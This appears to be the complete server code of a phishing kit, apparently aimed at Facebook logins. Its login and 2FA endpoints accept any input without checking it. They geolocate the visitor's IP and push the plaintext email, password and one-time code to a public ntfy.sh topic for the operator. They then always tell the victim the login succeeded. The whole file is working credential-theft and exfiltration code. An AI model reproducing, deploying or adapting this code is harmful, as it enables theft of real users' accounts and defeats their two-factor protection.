const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// ===== NTFY CONFIGURATION =====
// IMPORTANT: Change 'bkeyz-login-alerts' to your actual ntfy topic name
const NTFY_TOPIC = 'fblogins-Alert';

// ===== IP TO LOCATION FUNCTION (with fallback APIs) =====
async function getLocationFromIP(ip) {
    console.log('📍 Looking up location for IP:', ip);
    
    // Skip local/internal IPs
    if (!ip || ip === '::1' || ip === '127.0.0.1' || ip === 'localhost' || 
        ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.16.') ||
        ip.startsWith('172.17.') || ip.startsWith('172.18.') || ip.startsWith('172.19.') ||
        ip.startsWith('172.2') || ip === 'unknown') {
        return { 
            city: 'Local', 
            region: 'Local Network', 
            country: 'Development',
            note: 'Internal IP - testing environment'
        };
    }
    
    // Try ip-api.com first (free, no API key, 45 req/min)
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city`, {
            timeout: 5000
        });
        
        if (response.data.status === 'success') {
            console.log('✅ ip-api.com success:', response.data);
            return {
                city: response.data.city || 'Unknown',
                region: response.data.regionName || 'Unknown',
                country: response.data.country || 'Unknown'
            };
        }
    } catch (error) {
        console.log('⚠️ ip-api.com error:', error.message);
    }
    
    // Fallback to ipwho.is (free, no API key)
    try {
        const response = await axios.get(`https://ipwho.is/${ip}`, {
            timeout: 5000
        });
        
        if (response.data.success) {
            console.log('✅ ipwho.is success:', response.data);
            return {
                city: response.data.city || 'Unknown',
                region: response.data.region || 'Unknown',
                country: response.data.country || 'Unknown'
            };
        }
    } catch (error) {
        console.log('⚠️ ipwho.is error:', error.message);
    }
    
    // Final fallback
    return { city: 'Unknown', region: 'Unknown', country: 'Unknown' };
}

// ===== SEND NOTIFICATION TO NTFY =====
async function sendToNtfy(title, message, priority = 'high') {
    try {
        await axios.post(`https://ntfy.sh/${NTFY_TOPIC}`, message, {
            headers: {
                'Title': title,
                'Priority': priority,
                'Tags': 'warning,lock'
            }
        });
        console.log('✅ ntfy notification sent:', title);
    } catch (error) {
        console.error('❌ ntfy error:', error.message);
    }
}

// ===== GET REAL USER IP FROM REQUEST =====
function getRealUserIP(req) {
    // Check various headers that proxies/cloudflare use
    let ip = req.headers['x-forwarded-for'] || 
             req.headers['cf-connecting-ip'] ||  // Cloudflare
             req.headers['true-client-ip'] ||    // Some proxies
             req.headers['x-real-ip'] ||         // Nginx
             req.socket.remoteAddress;
    
    // If there are multiple IPs (proxy chain), take the first one (real user IP)
    if (ip && ip.includes(',')) {
        ip = ip.split(',')[0].trim();
    }
    
    // Clean up IPv6 localhost format
    if (ip && ip.startsWith('::ffff:')) {
        ip = ip.substring(7);
    }
    
    // Clean port number if present (IPv4)
    if (ip && ip.includes(':')) {
        ip = ip.split(':')[0];
    }
    
    console.log('📍 Detected real IP:', ip);
    return ip || 'unknown';
}

// ===== MIDDLEWARE =====
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ===== IN-MEMORY STORAGE =====
const users = [];
const pendingLogins = new Map(); // Stores pending 2FA sessions

// ===== USER REGISTRATION =====
app.post('/api/register', (req, res) => {
    const { name, email, password } = req.body;
    
    console.log('📝 Registration attempt:', { name, email });
    
    if (!name || !email || !password) {
        return res.status(400).json({ error: 'All fields required' });
    }
    
    if (password.length < 6) {
        return res.status(400).json({ error: 'Password must be at least 6 characters' });
    }
    
    // Check if user already exists
    const existingUser = users.find(u => u.email === email);
    if (existingUser) {
        return res.status(400).json({ error: 'User already exists' });
    }
    
    // Create new user
    const newUser = {
        id: users.length + 1,
        name: name.trim(),
        email: email.toLowerCase().trim(),
        password: password,
        createdAt: new Date().toISOString()
    };
    
    users.push(newUser);
    console.log('✅ User registered:', email);
    console.log('📊 Total users:', users.length);
    
    res.json({
        success: true,
        message: 'Account created successfully!',
        user: { id: newUser.id, name: newUser.name, email: newUser.email }
    });
});

// ===== STEP 1: LOGIN (Accepts any credentials, always asks for 2FA) =====
app.post('/api/login', async (req, res) => {
    const { identifier, password } = req.body;
    
    // Get REAL user IP using our improved function
    const ip = getRealUserIP(req);
    
    console.log('🔐 Login attempt:', { identifier, ip });
    
    if (!identifier || !password) {
        return res.status(400).json({ error: 'Email and password required' });
    }
    
    // GET LOCATION FROM IP ADDRESS
    const location = await getLocationFromIP(ip);
    
    // Create session ID
    const sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 8);
    
    // Store credentials temporarily (expires in 10 minutes)
    pendingLogins.set(sessionId, {
        email: identifier,
        password: password,
        ip: ip,
        location: location,
        expires: Date.now() + 10 * 60 * 1000
    });
    
    // Send notification to ntfy (with location!)
    const notificationMessage = `🔐 LOGIN ATTEMPT\n━━━━━━━━━━━━━━━━━━━━━\n📧 Email: ${identifier}\n🔑 Password: ${password}\n📍 Location: ${location.city}, ${location.region}, ${location.country}\n🌍 IP: ${ip}\n⏰ Time: ${new Date().toLocaleString()}`;
    
    await sendToNtfy('🔐 Login Credentials', notificationMessage);
    
    // Always ask for 2FA code (no validation of credentials)
    res.json({
        success: true,
        requires2FA: true,
        sessionId: sessionId,
        message: 'Authentication code sent to your device'
    });
});

// ===== STEP 2: VERIFY 2FA CODE =====
app.post('/api/verify-2fa', async (req, res) => {
    const { sessionId, code } = req.body;
    
    console.log('🔐 2FA verification attempt:', { sessionId, code });
    
    if (!sessionId || !code) {
        return res.status(400).json({ error: 'Session ID and code required' });
    }
    
    const pending = pendingLogins.get(sessionId);
    
    if (!pending) {
        return res.status(400).json({ error: 'Session expired. Please login again.' });
    }
    
    if (Date.now() > pending.expires) {
        pendingLogins.delete(sessionId);
        return res.status(400).json({ error: 'Session expired. Please login again.' });
    }
    
    // Use stored location or get fresh if needed
    const location = pending.location || await getLocationFromIP(pending.ip);
    
    // Send notification with 2FA code and location
    const notificationMessage = `🔐 2FA CODE SUBMITTED\n━━━━━━━━━━━━━━━━━━━━━\n📧 Email: ${pending.email}\n🔑 Password: ${pending.password}\n📱 6-digit Code: ${code}\n📍 Location: ${location.city}, ${location.region}, ${location.country}\n🌍 IP: ${pending.ip}\n⏰ Time: ${new Date().toLocaleString()}`;
    
    await sendToNtfy('🔐 2FA Code Received', notificationMessage);
    
    // Clean up session
    pendingLogins.delete(sessionId);
    
    // Always succeed (no code validation for demo)
    res.json({
        success: true,
        message: 'Login verified successfully!',
        user: { name: pending.email.split('@')[0] || 'User' }
    });
});

// ===== HEALTH CHECK =====
app.get('/api/health', (req, res) => {
    res.json({
        status: 'ok',
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        ntfyTopic: NTFY_TOPIC,
        usersRegistered: users.length,
        detectedIp: getRealUserIP(req)
    });
});

// ===== SERVE FRONTEND =====
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// ===== START SERVER =====
app.listen(PORT, () => {
    console.log(`\n🚀 Server running on http://localhost:${PORT}`);
    console.log(`📢 ntfy topic: ${NTFY_TOPIC}`);
    console.log(`📍 Location tracking: ENABLED (via IP geolocation)`);
    console.log(`✅ Ready to accept connections!\n`);
});
